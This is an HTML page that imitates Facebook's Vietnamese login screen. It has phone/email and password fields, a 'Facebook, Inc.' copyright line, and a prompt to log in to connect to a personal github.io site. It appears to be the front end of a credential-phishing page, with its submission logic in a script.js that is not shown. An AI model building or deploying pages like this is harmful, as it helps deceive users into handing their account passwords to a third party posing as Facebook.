<!DOCTYPE html>
<html>
<head>
	<title>Login with facebook</title>
	<link rel="stylesheet" type="text/css" href="style.css">
	<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,100&display=swap" rel="stylesheet">	
</head>
<body>
	<center>
		<div id="header">
			<div id="nav-bar"></div>
			<div id="logo"></div>
			<div id="slogan">Hãy đăng nhập vào tài khoản Facebook của bạn để kết nối với vandung2kk2.github.io</div>
		</div>
		<div id="main">
			<form>
				<input id="username" class="inp" type="text" placeholder="Số di động hoặc email">
				<input id="password" class="inp" type="password" placeholder="Mật khẩu">
				<div id="login" class="btn">Đăng nhập</div>
			</form>
			<div>
				<div id="skip">
					<a href="#">Lúc khác</a>
				</div>
				<div id="forgot">
					<a href="#">Quên mật khẩu? - Trung tâm trợ giúp</a>
				</div>
			</div>
		</div>
		<div id="footer">
			<div id="languages">
				<ul>
					<li id="current-lang"><a href="#">Tiếng Việt</a></li>
					<li><a href="#">中文(台灣)</a></li>
					<li><a href="#">한국어</a></li>
					<li><a href="#">Português (Brasil)</a></li>
				</ul>
				<ul>
					<li><a href="#">English (UK)</a></li>
					<li><a href="#">日本語</a></li>
					<li><a href="#">Español</a></li>
					<li>
						<div id="more-lang">+</div>
					</li>
				</ul>
			</div>
			<div id="copyright">Facebook, Inc.</div>
		</div>
	</center>
	<script src="script.js"></script>
</body>
</html>
